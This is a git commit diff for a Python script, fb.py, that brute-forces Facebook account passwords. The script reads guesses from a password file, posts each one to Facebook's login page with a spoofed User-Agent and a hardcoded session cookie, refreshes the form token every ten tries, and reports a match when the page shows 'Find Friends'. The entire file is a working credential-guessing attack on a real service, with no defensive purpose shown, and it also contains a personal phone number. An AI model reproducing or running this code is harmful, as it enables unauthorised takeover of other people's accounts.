83458313dff76b33c36be7316686a576e723c88c
Lokesh Jagdish Bhoyar <lokesh.prenoramance@gmail.com>
2018-04-13 16:33:56 +0530

    Add files via upload

--- fb.py
+++ fb.py
@@ -3,29 +3,30 @@ import threading
 import urllib.request
 import os
 from bs4 import BeautifulSoup
+import sys
+try:
+	if sys.version_info[0] < 3:
+		raise "REQUIRED PYTHON 3.x"
+except Exception as ex:
+	print('''		--------------------------------------
+			REQUIRED PYTHON 3.x
+			use: python3 fb.py
+			for more contact 8419027520
+		--------------------------------------
+			''')
+	sys.exit()
 post_url='https://www.facebook.com/login.php'
-
-def function(email,passw,i):
-        payload,cookie=create_form()
-        payload['email']=email
-        payload['pass']=passw
-        #print('lsd : ',payload['lsd'])
-        #print(cookie)
-        r=requests.post(post_url,data=payload,cookies=cookie)
-        if 'Find Friends' in r.text:
-        	print('password is ',passw)
-        	#open('d.html','w').write(r.text)
-        	return True
-        else:
-                print(i,passw)
-        return False
-
+headers = {
+	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+}
+payload={}
+cookie={}
 def create_form():
 	form=dict()
-	cookie={'fr':'07hJjVbDnGNx6xTea..BYlwm_.eH.AAA.0.0.BYlwrR.AWVJg_pv'}
-	data=requests.get(post_url)
-	#print('Form Creating : ',data.url)
-	#print('Return Status : ',data.status_code)
+	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
+	data=requests.get(post_url,headers=headers)
+	# print('Form Creating : ',data.url)
+	# print('Return Status : ',data.status_code)
 	#for i in data.headers:
 	#	print(i,' : ',data.headers[i])
 	for i in data.cookies:
@@ -35,19 +36,36 @@ def create_form():
 		form['lsd']=data.input['value']
 	return (form,cookie)
 
+def function(email,passw,i):
+	global payload,cookie
+	if i%10==1:
+		payload,cookie=create_form()
+		payload['email']=email
+	payload['pass']=passw
+	print(payload)
+	print(cookie)
+	#print('lsd : ',payload['lsd'])
+	#print(cookie)
+	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
+	if 'Find Friends' in r.text:
+		print('password is ',passw)
+		#open('d.html','w').write(r.text)
+		return True
+	else:
+		print(i,passw)
+	return False
+
 #payload=create_form()
 print('___________________________________________________________________________\n')
 file=open('passwords.txt','r')
 i=0
 email=input('Enter Email : ')
 while file:
-		passw=file.readline().strip()
-		i+=1
-		print(i,passw)		
-		#payload['email']=email
-		#payload['pass']=passw
-		#if function(passw,payload):
-		#	break
-		threading.Thread(target=function,args=(email,passw,i)).start()
-		if not i%10:
-                        os.system('pause')
+	passw=file.readline().strip()
+	i+=1
+	print("Trying : ",i,passw)
+	if function(email,passw,i):
+		break
+	# threading.Thread(target=function,args=(email,passw,i)).start()
+	# if not i%10:
+		# os.system('pause')
